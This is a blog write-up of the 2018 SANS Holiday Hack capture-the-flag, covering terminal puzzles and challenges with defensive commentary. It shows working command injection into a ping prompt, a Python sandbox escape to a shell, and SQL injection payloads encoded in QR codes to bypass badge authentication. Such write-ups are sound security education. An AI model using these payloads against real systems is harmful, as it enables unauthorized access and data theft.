---
layout: post
title: SANS Holiday Hack - 2018
description: SANS Holiday Hack - 2018
categories: [ctf, sans]
tags: [ctf, sans]
---

Happy holidays everyone! Today's post is my write-up for the 2018 SANS Holiday Hack Challenge!


## Table of Contents
[Cranberry Pi Puzzles](#cranberry-pi-puzzles)
  1. [Essential Editor Skills](#essential-editor-skills)
  2. [The Name Game](#the-name-game)
  3. [Stall Mucking](#stall-mucking)
  4. [CURLing Master](#curling-master)
  5. [Python Escape](#python-escape)
  6. [Dev Ops Fail](#dev-ops-fail)
  7. [The Sleighbell](#the-sleighbell)
  8. [Leathal ForensicELFication](#leathal-forensicelfication)
  9. [Yule Log Analysis](#yule-log-analysis)
  10. [Cranberry Pi - Conclusion](#cranberry-pi-conclusion)


[CTF Challenges](#ctf-challenges)
  1. [Orientation Challenge](#1-orientation-challenge)
  2. [Directory Challenge](#2-directory-challenge)
  3. [de Bruijn Sequences](#3-de-bruijn-sequences)
  4. [Data Repo Analysis](#4-data-repo-analysis)
  5. [AD Privilege Discovery](#5-ad-privilege-discovery)
  6. [Badge Manipulation](#6-badge-manipulation)
  7. [HR Incident Response](#7-hr-incident-response)
  8. [Network Traffic Forensics](#8-network-traffic-forensics)
  9. [Ransomware Recovery](#9-ransomware-recovery)
  10. [Who Is Behind It All?](#10-who-is-behind-it-all)
  11. [CTF - Conclusion](#ctf-conclusion)

## Cranberry Pi Puzzles

### Essential Editor Skills

[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=viescape&id=9f175bb8-baca-4f91-a7e0-acb49ce61a5e)

This challenge is located to the right side of the Castle entryway.

Talking with Bushy Evergreen, it seems like she's trying to learn. Booting up the Cranberry, we get the following:
![Essential Editor]({{ site.baseurl }}/images/Essential-Editor.png)

Easy enough, Esc + :q!.
Note that I didn't have to press escape because I was already in command mode, but it's never a bad idea to double check, and similarly I did not have to use the "!" to force quit, but that's just a (bad) habit.

Now that I've helped her, Bushy gives me the following hint for Challenge 1
>If you listen closely to Ed Skoudis' talk at the con, you might even pick up all the answers you need...

### The Name Game
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=pwshmenu&id=81397ae8-3cde-48e9-ba61-03414535ed9b)

This challenge is located to the left of the castle entryway.

Minty Candycane seems to have forgotten her coworker's, last name "Chan", first name, and wants our help finding it out using Alabaster Snowball's tools. She drops some hints that it is probably using an SQLite database, and that the onboarding system probably uses PowerShell.

When we open our shell, we are given the option to start the onboarding process, verify the system, or quit the application. Since Minty thought it was important to tell us about the onboarding system, that seems like a good place to start.

After spending 30 minutes unsucessfully trying to inject into the onboarding option, I finally decided I would take a look at option two, system verification. Running it gave me the following:

```
Validating data store for employee onboard information.
Enter address of server: 1.2.3.4.
ping: unknown host 1.2.3.4
onboard.db: SQLite 3.x database
```

This seems ripe for injection, let's try saying our server is _1.2.3.4; sqlite3 onboard.db_...
```
Validating data store for employee onboard information.
Enter address of server: 1.2.3.4; sqlite3 onboard.db
connect: Network is unreachable
SQLite version 3.11.0 2016-02-15 17:29:24
Enter ".help" for usage hints.
sqlite>
```

Looks like we got database access. Let's enumerate the schema, then get Chan's first name.

```
sqlite> .tables
onboard
sqlite> .schema onboard
CREATE TABLE onboard (
    id INTEGER PRIMARY KEY,
    fname TEXT NOT NULL,
    lname TEXT NOT NULL,
    street1 TEXT,
    street2 TEXT,
    city TEXT,
    postalcode TEXT,
    phone TEXT,
    email TEXT
);
sqlite> SELECT * FROM onboard WHERE lname LIKE "Chan";
84|Scott|Chan|48 Colorado Way||Los Angeles|90067|4017533509|scottmchan90067@gmail.com
```

Oddly enough, I found it easiest to use the same command injection vulnerability to submit my answer.
```
Enter address of server: 1.2.3.4; runtoanswer
connect: Network is unreachable
Loading, please wait......



Enter Mr. Chan's first name: Scott

...

Congratulations!
```

Since we helped her, Minty offers the following advice:

>Have you ever visited a website and seen a listing of files - like you're browsing a directory? Sometimes this is enabled on web servers.
>On a website, it's sometimes as simple as removing characters from the end of a URL.

Why does this exploit work? The underlying PowerShell script likely looked something like this:
```
$host = Read-Host -Prompt 'Enter the address of server'
ping.exe $host
```
Because the input is completely trusted, when we add _"; newcmd"_ to the end of the input, we are telling the PowerShell engine to run _ping.exe_, then, with the ";" character, to also execute _newcmd_.

A more secure script should escape the user input, as so:
```
$host = Read-Host -Prompt 'Enter the address of server'
ping.exe "$host"
```

[Relevant KringleCon Talk](https://www.youtube.com/watch?v=wd12XRq2DNk)

### Stall Mucking
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=plaintext-creds&id=111092dd-1bfe-44c7-bed6-cb6c46f9901b)

This challenge is located in the hallway off of the right side of the entryway.

Wunorse Openslae (still the best named elf in the North Pole) needs to submit his report to Santa, but he forgot his password! He also tells us that it is a shared password used in a bunch of different tasks, so there is probably some way for us to find it in memory.

Upon opening the terminal, we're tasked with uploading report.txt to the samba share at //localhost/report-upload/.
Given that Wunorse explicitly stated that we can find it in memory, and memory is formed by running processes, let's go ahead and get the process list.
```
elf@c44a376a2958:~$ ps -AF
UID        PID  PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
root         1     0  0  4488  2780   0 04:09 pts/0    00:00:00 /bin/bash /sbin/init
root        11     1  0 11330  3172   2 04:09 pts/0    00:00:00 sudo -u manager /home/manager/s
...
```

Uh oh! The text is cut off for the sudo command. Let's pipe it into _less -+S_.
```
elf@c44a376a2958:~$ ps -AF | less -+S | cat
UID        PID  PPID  C    SZ   RSS PSR STIME TTY          TIME CMD
root         1     0  0  4488  2780   0 04:09 pts/0    00:00:00 /bin/bash /sbin/init
root        11     1  0 11330  3172   2 04:09 pts/0    00:00:00 sudo -u manager /home/manager/samba-wrapper.sh --verbosity=none --no-check-certificate --extraneous-command-argument --do-not-run-as-tyler --accept-sage-advice -a 42 -d~ --ignore-sw-holiday-special --suppress --suppress //localhost/report-upload/ directreindeerflatterystable -U report-upload
```

Looks like the upload password is [directreindeerflatterystable](https://xkcd.com/936/). Let's upload Wunorse's report using _smbclient_.
```
elf@c44a376a2958:~$ smbclient -U report-upload%directreindeerflatterystable //localhost/report-upload -c 'put "report.txt"'
WARNING: The "syslog" option is deprecated
Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian]
putting file report.txt as \report.txt (500.9 kb/s) (average 501.0 kb/s)
elf@c44a376a2958:~$
...

You have found the credentials I just had forgot,
And in doing so you've saved me trouble untold.
Going forward we'll leave behind policies old,
Building separate accounts for each elf in the lot.

-Wunorse Openslae
```

How can we avoid disclosing credentials in this way, though? If you have a command line tool that requires a password as a parameter, the best way to do it would be to pipe the password via STDIN, if possible. For example, with CURL, you can do the following:
```
curl  https://xyz.abc.com -K- <<< "-u user:password"
```

The idea is that you are supplying arbitrary config options ("-K") via STDIN ("-"), then, via a [here string](https://unix.stackexchange.com/questions/80362/what-does-mean), sets the username and password to be used without putting it on the command line of the running process. It will, however, still be present in the bash history.

So, really, the right solution is to not use tools that require passwords on the command line.

### CURLing Master
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=http2&id=39c89995-d425-49c5-b2ef-beacaeb1b603)

This challenge is located down the hallway to the left of the castle entryway.

Holly Evergreen broke the Candy Cane Striper(stripper?) again this year! This time, according to Holly, her brother, Bushy Evergreen, has made it so the only way to restart the server is with some "arcane" HTTP calls.

Opening up our shell, we see the following
```
Complete this challenge by submitting the right HTTP
  request to the server at http://localhost:8080/ to
  get the candy striper started again. You may view
  the contents of the nginx.conf file in
  /etc/nginx/, if helpful.
```

Seems easy enough. As we know that the server is running http2, let's curl it with that version.
```
elf@d0cd700f751b:~$ curl --http2 http://localhost:8080/index.php
<unreadable characters>elf@d0cd700f751b:~$
elf@d0cd700f751b:~$ curl --http2 http://localhost:8080/index.php | od
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   114    0   114    0     0   124k      0 --:--:-- --:--:-- --:--:--  111k
0000000 000000 002022 000000 000000 000000 000003 000000 000200
0000020 000004 000001 000000 000005 177777 000377 002000 000010
0000040 000000 000000 177577 000000 000000 003410 000000 000000
0000060 000000 000000 000000 000000 000001
0000071
elf@d0cd700f751b:~$
```

In the interest of brevity, I won't go into the details of the half hour I spent trying to determine what format the data took and how to interpret it.

But, in a moment of frustration, I just kept hitting the up arrow, and, lo and behold, there was this:
```
curl --http2-prior-knowledge http://localhost:8080/index.php
```

Someone left us a helpful tip in the bash history!
Running it told us what our next step should be, completing the challenge
```
elf@d0cd700f751b:~$ curl --http2-prior-knowledge http://localhost:8080/index.php
...
To turn the machine on, simply POST to this URL with parameter "status=on"
...
elf@d0cd700f751b:~$ curl -XPOST --http2-prior-knowledge http://localhost:8080/index.php?status=on
...
Hey, good job!  But I'm picky.  I'd rather just have you POST the status in the body of your request.
...
elf@d0cd700f751b:~$ curl -XPOST --http2-prior-knowledge http://localhost:8080/index.php -d 'status=on'
...
Unencrypted 2.0? He's such a silly guy.
That's the kind of stunt that makes my OWASP friends all cry.
Truth be told: most major sites are speaking 2.0;
TLS connections are in place when they do so.

-Holly Evergreen
Congratulations! You've won and have successfully completed this challenge.
POSTing data in HTTP/2.0.
...
```

Since we helped her again, she gives us the following hint:
>Have you ever used Bloodhound for testing Active Directory implementations?

Now, why did I have to use _"--http2-prior-knowledge"_ and not _"--http2"_?
Well, it turns out that HTTP2 by default sends an Upgrade message, as defined with HTTP1.1. Since our server is running only HTTP2, that initial message seemed to have failed. Let me test that hypothesis.
```
elf@d0cd700f751b:~$ curl --http2 http://localhost:8080/index.php -v
*   Trying 127.0.0.1...
* TCP_NODELAY set
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /index.php HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.52.1
> Accept: */*
> Connection: Upgrade, HTTP2-Settings
> Upgrade: h2c
> HTTP2-Settings: AAMAAABkAARAAAAA
>
* Curl_http_done: called premature == 0
* Connection #0 to host localhost left intact
```

Well, certainly seems to be that the Upgrade message fails.

[Relevant KringleCon Talk](https://www.youtube.com/watch?v=PC6-mn9g9Cs)

### Python Escape
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=python_docker_challenge&id=b3a58a4d-2a41-499d-9b62-052de62e88c3)

This challenge is located upstairs and to the left.

SugarPlum Mary is stuck inside the Python interpreter! Let's help her out.

Logging into our terminal tells us that our task is to escape, then run *./i_escaped*.

Very quickly, I discovered that import, exec, and system are all restricted commands. Eval, however, is not. Using eval to call the \_\_import\_\_ function from inside a new Python session should work nicely.

```
>>> x = eval("__imp" + "ort__(\"os\")")
>>> x.system("/bin/bash")
elf@c0bdc285c792:~$ ls
i_escaped
elf@c0bdc285c792:~$ ./i_escaped
Loading, please wait......



  ____        _   _
 |  _ \ _   _| |_| |__   ___  _ __
 | |_) | | | | __| '_ \ / _ \| '_ \
 |  __/| |_| | |_| | | | (_) | | | |
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|


That's some fancy Python hacking -
You have sent that lizard packing!

-SugarPlum Mary

You escaped! Congratulations!
```

Since we helped her, SugarPlum clues us in on the following:
>As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - [Packalyzer](https://packalyzer.kringlecastle.com/).
>Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.
>Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.
>There was suspicious-looking development code using environment variables to store SSL keys and open up directories.
>This elf then told me that manipulating values in the URL gave back weird and descriptive errors.

Sounds like Santa will be getting pwned for Christmas.

Now, why did that python trickery work? As I alluded to, _eval_ opens up an entirely new Python session for its code to execute in, meaning that all of the restrictions on the original shell do not apply. Using\_\_import\_\_, the functional version of the _import_ directive, returns the Python object referenced. By storing this object in a local variable, I can then call _system_, popping myself a shell.

[Relevant KringleCon Talk](https://www.youtube.com/watch?v=ZVx2Sxl3B9c)

### Dev Ops Fail
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=gitpasshist&id=9f716d85-d881-4855-9b84-54003dcc5765)

Sparkle Redberry is under investigation from Elf Resources for uploading a sensitive file into his git repository. He wants our help to prove that he successfully deleted it.

First things first, let's just search the git log and see if any commits have password in their title or description...
```
...
commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b
Author: Sparkle Redberry <sredberry@kringlecon.com>
Date:   Thu Nov 8 21:11:03 2018 -0500

    Per @tcoalbox admonishment, removed username/password from config.js, default settings in c
onfig.js.def need to be updated before use

...
```

Well, now we know what commit he removed the passwords with. Let's rebase to exactly one commit before, so that we can view the file before it was deleted.

```
elf@8e2a8f3b006d:~/kcconfmgmt$ git reset --hard 60a2ffea7520ee980a5fc60177ff4d0633f2516b~1
HEAD is now at b2376f4 Add passport module
elf@8e2a8f3b006d:~/kcconfmgmt$ cat server/config/config.js
// Database URL
module.exports = {
    'url' : 'mongodb://sredberry:twinkletwinkletwinkle@127.0.0.1:27017/node-api'
};
elf@8e2a8f3b006d:~/kcconfmgmt$
```

We have your password Sparkle. Please report to Elf Resources to have your access badge taken.

Probably in an effort to bribe us with information, or maybe he's just thankful that we showed him his error instead of his boss, he gave us the following tip.
>I wonder if Tangle Coalbox has taken a good look at his own employee import system.
>It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had.
>I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there.

In the future, hopefully Sparkle, and all Git users, remember that the only truely secure way to remove a file from a git repository is to rebase to before the file was tracked, then integrate all of the commits that have been made since. This may seem trivial, but I vaugely recall earlier this year there was a report outlining how many public repositories have private information including passwords, API keys, and private keys.

### The Sleighbell
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=unlinked-function&id=4bf371c1-4760-44e6-ac96-95ae056dff71)

Shinny Upatree wants our help to make him win the Sleigh Bell Lotto. He also seems to think that GDB will help us do so. What I want to know is, what's my cut Shinny?

Opening up our shell, we have one program, _sleighbell-lotto_. I opened it up in GDB and used the _start_ command to let it execute until the main function.

From here, I used the command _disass_ to show me the assembly code for the function.
```
(gdb) disass
...
   0x0000555555555571 <+167>:   call   0x5555555548f0 <printf@plt>
   0x0000555555555576 <+172>:   lea    rdi,[rip+0x584a]        # 0x55555555adc7
   0x000055555555557d <+179>:   call   0x555555554910 <puts@plt>
   0x0000555555555582 <+184>:   cmp    DWORD PTR [rbp-0x4],0x4c9
   0x0000555555555589 <+191>:   jne    0x555555555597 <main+205>
   0x000055555555558b <+193>:   mov    eax,0x0
   0x0000555555555590 <+198>:   call   0x555555554fd7 <winnerwinner>
   0x0000555555555595 <+203>:   jmp    0x5555555555a1 <main+215>
   0x0000555555555597 <+205>:   mov    eax,0x0
   0x000055555555559c <+210>:   call   0x5555555554b7 <sorry>
   0x00005555555555a1 <+215>:   mov    edi,0x0
   0x00005555555555a6 <+220>:   call   0x555555554920 <exit@plt>
```

Of particular intrest is the conditional at main+191. That seems to be the conditional that determines if I am a winner or a loser. I ain't no loser, so I'm going to set a breakpoint on the test above it, then change the value for the number we drew (RBP-4) to be the winning number.

```
(gdb) b *0x0000555555555582
(gdb) continue
Continuing.

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 2265!


Breakpoint 2, 0x0000555555555582 in main ()
(gdb) x/d (int *)($rbp-0x4)
0x7fffffffe5fc: 2265
(gdb) set *0x7fffffffe5fc = 1225
(gdb) x/d (int *)($rbp-0x4)
0x7fffffffe5fc: 1225
(gdb) continue
...
With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!


Congratulations! You've won, and have successfully completed this challenge.
```

If only the real lottery was this easy.

As payment for making Shinny very, very rich he gives us the following information:
>Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie?
>Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted.
>An elf I follow online said he analyzed Wannacookie and that it communicates over DNS.
>He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way.
>Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie!

Sounds like our helpdesk technician/systems administrator/security analyst might have potentially ran some malware on his workstation. That's less than ideal, but with the advice Shinny gave us we can probably do a little offense to get their files back.

### Leathal ForensicELFication
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=viminfo&id=d2415019-a706-49a0-b56a-e8166dbae470)

Tangle Coalbox, an investigator with Elf Resources, needs our help to analyze a box. From what he has said, they believe that a text editor was used to do something against policy, but he doesn't know what, if any, forensic artifacts get left behind by text editors.

Upon entering the shell, we find out that our precise task is to determine who an appearantly creepy poem was wrote about. A quick listing of the directory( including hidden files ) yields the following:
```
elf@90bb954d3cf6:~$ ls -la
total 5460
drwxr-xr-x 1 elf  elf     4096 Dec 25 01:51 .
drwxr-xr-x 1 root root    4096 Dec 14 16:28 ..
-rw-r--r-- 1 elf  elf      419 Dec 14 16:13 .bash_history
-rw-r--r-- 1 elf  elf      220 May 15  2017 .bash_logout
-rw-r--r-- 1 elf  elf     3540 Dec 14 16:28 .bashrc
-rw-r--r-- 1 elf  elf      675 May 15  2017 .profile
drwxr-xr-x 1 elf  elf     4096 Dec 14 16:28 .secrets
-rw-r--r-- 1 elf  elf     7376 Dec 25 01:51 .viminfo
-rwxr-xr-x 1 elf  elf  5551072 Dec 14 16:13 runtoanswer
```
Since we were given the tip that we should look for text editor artifacts, _.viminfo_ seems like the place to go.
```
elf@90bb954d3cf6:~$ more .viminfo
# This viminfo file was generated by Vim 8.0.
# You may edit it if you're careful!

# Viminfo version
|1,4

# Value of 'encoding' when this file was written
*encoding=latin1


# hlsearch on (H) or off (h):
~h
# Last Substitute Search Pattern:
~MSle0~&Elinore

# Last Substitute String:
$NEVERMORE

# Command Line History (newest to oldest):
:q
|2,0,1545702702,,"q"
:wq
|2,0,1536607231,,"wq"
:%s/Elinore/NEVERMORE/g
|2,0,1536607217,,"%s/Elinore/NEVERMORE/g"
:r .secrets/her/poem.txt
|2,0,1536600314,,"r .secrets/her/poem.txt"
:w
|2,0,1536606841,,"w"
:s/God/fates/gc
|2,0,1536606833,,"s/God/fates/gc"
:%s/studied/looking/g
|2,0,1536602549,,"%s/studied/looking/g"
:%s/sound/tenor/g
|2,0,1536600579,,"%s/sound/tenor/g"

# Search String History (newest to oldest):
? Elinore
|2,1,1536607217,,"Elinore"
? God
|2,1,1536606833,,"God"
? rousted
```

Since Elinore is both a woman's name, and appears at least three times in the history, lets try that as our answer.

```
elf@90bb954d3cf6:~$ ./runtoanswer
Loading, please wait......
Who was the poem written about? Elinore
...
Thank you for solving this mystery, Slick.
Reading the .viminfo sure did the trick.
Leave it to me; I will handle the rest.
Thank you for giving this challenge your best.

-Tangle Coalbox
-ER Investigator

Congratulations!
```

Elinore, I know at least one elf that you should keep away from.

What is this .viminfo file though? Well, after reading through [this page](https://tm4n6.com/2017/11/15/forensic-relevance-of-vim-artifacts/), it seems that it is an optional feature, enabled by default, that is used to remember command history and other data between instances of vim. I honestly didn't know that, so in the future I will be more mindful of what data I type into the command window, or what data I pull into vim registers, lest I pull a Sparkle Redberry and disclose my passwords to everyone.

### Yule Log Analysis
[Link to Cranberry Pi terminal](https://docker.kringlecon.com/?challenge=spray-detect&id=ffac0365-6454-4ec9-b78f-87fa350a4d26)

Pepper Minstix has asked for our help assessing the scope of a password spraying attack. Elf Web Access administrators know that an account was compromised, but they do not know which one. She lets us know that the event logs will be in _.evtx_ format, but that there is a Python library to convert it to XML for easy viewing.

Logging into our shell, we already have both the evtx file, and a python script to dump it into XML.

I'm going to be honest, this challenge was a learning curve for me, and I'm sure there's a better way to do it, but I wound up using the following python script to search the XML logs for sucessful logins, then adding the username that logged in to a set, as sets do not allow duplicates.
```python
>>> e = xml.etree.ElementTree.parse('events.xml')
>>> doc = e.getroot()
>>> vals = doc.findall("*")
>>> usernames = set()
>>> for val in vals:
...  if( val.find("{http://schemas.microsoft.com/win/2004/08/events/event}System").find("{http://schemas.microsoft.com/win/2004/08/events/event}EventID").text == '4624' ):
...   usernames.add(val.find("{http://schemas.microsoft.com/win/2004/08/events/event}EventData"
)[5].text)
...
>>> usernames
set(['Administrator', 'minty.candycane', 'ANONYMOUS LOGON', 'shinny.upatree', 'NETWORK SERVICE', 'SYSTEM', 'LOCAL SERVICE', 'bushy.evergreen', 'HealthMailboxbab78a6', 'MSSQL$MICROSOFT##WID', 'HealthMailboxbe58608', 'wunorse.openslae', 'sparkle.redberry', 'IUSR', 'DWM-1'])
```

Since I know that most of these usernames do not support interactive login, I'm just going to take them out of the set, then just try each remaining username with _runtoanswer_.

```
elf@7ba940757011:~$ ./runtoanswer
Loading, please wait......

Whose account was successfully accessed by the attacker's password spray? minty.candycane

...

Silly Minty Candycane, well this is what she gets.
"Winter2018" isn't for The Internets.
Passwords formed with season-year are on the hackers' list.
Maybe we should look at guidance published by the NIST?

Congratulations!
```

This is not, at all, the "enterprise" way to do this. If a similar situation had occured in a SOC I worked in, I would have already had the logs in a SIEM, or have been able to easily import them, where I would have selected the timeframe of the attack and searched for successful logons.

[Link to Relevant KringleCon Talk](https://www.youtube.com/watch?v=khwYjZYpzFw)

### Cranberry Pi Conclusion

This year's Cranberry Pi puzzles were fun! I feel like they improved upon last years, in that none of the challeges felt overly contrived. For example, in last year's Hack, there was a challege where you were meant to escalate privilege, given that you could use _sudo_ to execute _find_, so long as you specified that you were assuming a specific GID. I also appreciated that most (all?) of the challeges had hints, either in the form of a KringleCon talk or outside resources that were linked to elsewhere.
In fact, the only critique I have is that there is not a way to determine if you have completed every challenge. I am relatively certain I got all of them, but I have no way of knowing for sure.

## CTF Challenges

### 1) Orientation Challenge
>What phrase is revealed when you answer all of the questions at the KringleCon Holiday Hack History kiosk inside the castle?
[Link to Questions](https://www.holidayhackchallenge.com/2018/challenges/osint_challenge_windows.html)

This is an OSINT collection challenge. I listened to the __Start Here__ talk for the answers for questions 1-3. Questions 4-6 I knew from memory, as I participated in last year's holiday hack.

1. In 2015, the Dosis siblings asked for help understanding what piece of their "Gnome in Your Home" toy?
>Firmware
2. In 2015, the Dosis siblings disassembled the conspiracy dreamt up by which corporation?
>ATNAS
3. In 2016, participants were sent off on a problem-solving quest based on what artifact that Santa left?
>Buisness card
4. In 2016, Linux terminals at the North Pole could be accessed with what kind of computer?
>Cranberry Pi
5. In 2017, the North Pole was being bombarded by giant objects. What were they?
>Snowballs
6. In 2017, Sam the snowman needed help reassembling pages torn from what?
>The Great Book

The flag is "Happy Trails"

### 2) Directory Challenge
>Who submitted (First Last) the rejected talk titled Data Loss for Rainbow Teams: A Path in the Darkness? [Please analyze the CFP site to find out](https://cfp.kringlecastle.com/).

This is the first challenge I solved, and it was completely on accident. I clicked on the "CFP" button on the top right of the homepage, which brought me to _https://cfp.kringlecastle.com/cfp/cfp.html_. In my attempt to get back to the home page, I clicked back into the URL bar, and hit Control+Shift+Left one two few times before I hit backspace then enter.

Lo and behold, there was a fully listed directory, including _rejected-talks.csv_, which I searched using my web browser for the given title.

John McClane, sorry about your talk. I, for one, would have loved to have heard what a rainbow team was and how they lose data.

[Link to Relevant KringleCon Talk]
[Link to Relevant KringleCon Talk]
### 3) de Bruijn Sequences
On the holiday hack challenge page:
>The KringleCon Speaker Unpreparedness room is a place for frantic speakers to furiously complete their presentations. The room is protected by a door passcode. Upon entering the correct passcode, what message is presented to the speaker?
Within KringleCon:
>When you break into the speaker unpreparedness room, what does Morcel Nougat say?
[Link to speaker unprepardness room lock](https://doorpasscoden.kringlecastle.com/)

Given the name of the challenge, it seemed prudent to learn what de Bruijn sequences were. After some [preliminary reasearch](https://en.wikipedia.org/wiki/De_Bruijn_sequence#Uses), it became clear that the lock was a "cycling PIN", and as such could be represented as a de Bruijn sequence, making brute forcing it considerably easier.

Given k=4, n=4, [I generated the following sequence](http://www.hakank.org/comb/debruijn.cgi):
>0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0

Zero-indexing the buttons, as god intended, I broke the lock in under 50 clicks, giving the message "Welcome unprepared speaker!" This solves the puzzle as presented on [the hack challenge page](https://holidayhackchallenge.com/2018/story.html), and in game, despite the question being worded differently.

For us defenders, what does this challenge show us? Well, it shows us that interpreting the last _n_ things recieved as a valid input is a dangerous practice. Rather, we should always require the user to provoide the entire PIN, passcode, or other challege information at once in order to avoid vastly simplifying the complexity of our challenge.

Unfortunately, solving this puzzle seems to trigger the toy soldiers to go rouge. They are now blocking the doors to the castle and barricading doors. Oops.

### 4) Data Repo Analysis
>Retrieve the encrypted ZIP file from the [North Pole Git repository](https://git.kringlecastle.com/Upatree/santas_castle_automation). What is the password to open this file?

After navigating to the repository, it became immediately clear to me that my first task would be finding the encrypted ZIP file.
Using the "Find file" function for _.zip_, we only get two results, _schematics/ventilationdiagrams.zip_ and _castlecommandcenter/vendor/angular/angular.min.js.gzip_. As I'm fairly confident that the Angular framework isn't a secret, that leaves the ventilation diagrams as our target ZIP file.
Now that we know what file the password is for, let's find the password.

First, using the "History" button, we can easily determine which commit added the ZIP file to the repository. From there, I manually crawled upward in the git log, finding a commit with a message of "removing accidental commit." Opening this commit in GitLab clearly shows us Shinny's password, "Yippee-ki-yay." Testing it on the zip confirms that this password was used to encrypt _very_ detailed schematics of the Castle.

As previously noted when Sparkle uploaded his password in the __Dev Ops Fail__ puzzle, if you find yourself in a situation where you accidentally tracked a file that you shouldn't have, or a commit accidentally included sensitive information, the only way to prevent everyone with a copy of the repository from also retaining a copy of your accidental leak is to rebase to before the relevant commit, then merge in all commits that have occured since.

With spot on timing, Hans outs himself as the mastermind of the toy soldiers going rouge. He goes on to demand the relase of his comrades: the New Arietes Front, Miss Cindy Lou Who, and Glinda. As these three have been responsible for the war on Christmas three years running, I find it unlikely that Santa will release them. As such, we should probably get to work helping Santa and the Elves bring down Hans.

Or maybe we should stop, since every time we do a task the situation worsens.

Nope, let's keep working.

[Link to Relevant KringleCon Talk](https://www.youtube.com/watch?v=myKrWVaq3Cw)

### 5) AD Privilege Discovery
>Using the data set contained in this [SANS Slingshot Linux image](https://download.holidayhackchallenge.com/HHC2018-DomainHack_2018-12-19.ova), find a reliable path from a Kerberoastable user to the Domain Admins group. What’s the user’s logon name? Remember to avoid RDP as a control path as it depends on separate local privilege escalation flaws.

This sounds like a job for Bloodhound!

For those unaware, Bloodhound is a tool for analyzing and visualizing trust relationships within a single Active Directory forest. One of the many functions it has is the ability to query for the shortest path between user accounts vulnerable to [kerberoast](https://attack.mitre.org/techniques/T1208/) and domain administrators.

I actually had a really, really hard time starting up the VM. It did not want to start in VirtualBox, giving no error for me to try to troubleshoot. My install of VMWare Workstation Player is also appearantly broken, as I could not use the GUI to unpack and start the VM image provided, forcing me to use the CLI for both tasks.

Once I got it started, it was easy enough to open up Bloodhound, log in with the provided credentials, and select the pre-built query for "Shortest path to Domain Administrator from Kerberoastable user." As we were explicitly told to ignore users that relied on RDP, I additionally applied what Bloodhound calls an Edge Filter for CanRDP, which is to say that any links formed by permitted RDP will be excluded from the displayed graph. This displayed the following.
![Essential Editor]({{ site.baseurl }}/images/Bloodhound.png)

Clearly, the shortest path available begins with "LDUBEJ00320@AD.KRINGLECASTLE.COM"

Defending against Active Directory reconaissance is not an easy feat. Bloodhound does not, by default, use any unusual ports or accounts to collect the data it needs. As such, mointoring tools to detect completely unmodified scans scans should focus on detecting a large number of concurrent LDAP queries. That being said, as we all know, security through obscurity isn't security at all. If you conduct routine audits of your own domain, possibly even with Bloodhound, you should be able to reduce or eliminate the abusable trusts between different objects and OUs in Active Directory.

### 6) Badge Manipulation
>Bypass the authentication mechanism associated with the room near Pepper Minstix. [A sample employee badge is available](https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg). What is the access control number revealed by the door authentication panel?

At first, I struggled to think of a way to exploit this. I almost caved and actually went to find the hints, but after talking with my sister, it occured to me that the ID card is just another form of input to be exploited.

Using my phone to read the QR code on Alabaster's badge, I learned that the QR code is an encoding of the raw text _oRfjg5uGHmbduj2m_. To me, that value seems random, so I went ahead and started doing the first thing that any attacker does with web input: SQL injection.
Before sending any traffic, I'm going to have Firefox's Inspect Element window open to the network tab, in order to hopefully capture a URL that I can directly exploit.
With that done, I generated a QR code using [this site](https://www.the-qrcode-generator.com/) with the text _' OR '1'='1' --_, saved it to my computer, and uploaded it to the door via the USB.

Unfortunately, the network traffic is a direct upload of the provided image, so I can't use any tool I'm aware to automatically find a valid exploit. One win from capturing the network traffic, though, is that instead of being forced to read the scrolling message on the LCD panel, I can see the full response:
>EXCEPTION AT (LINE 96 "user_info = query("SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1".format(uid))"): (1064, u"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '' LIMIT 1' at line 1")

This tells us three things. One, this application is, in fact, vulnerable to SQL injection. Two, we now know the exact format of the query our input is used in. And three, we know that the database server is MariaDB.

Given this information, the next query I tried was _' OR '1'='1_. Note the lack of a trailing single quote, as the single quote after the format will close it. Generating and submitting the QR code for this gave the following error:
>Authorized User Account Has Been Disabled!

Well that's less than ideal. Luckily, as we know the entire query string, we know that there is a column named _enabled_ that we can build a conditional on. Knowing that, I built a query to effectively select the first user that is both authorized and enabled. Generating and submitting the QR code for my query, _' OR ( enabled  = 1 AND '1'='1') AND '1'='1_, resulted in sucessful authentication, telling us that the control number is 19880715.

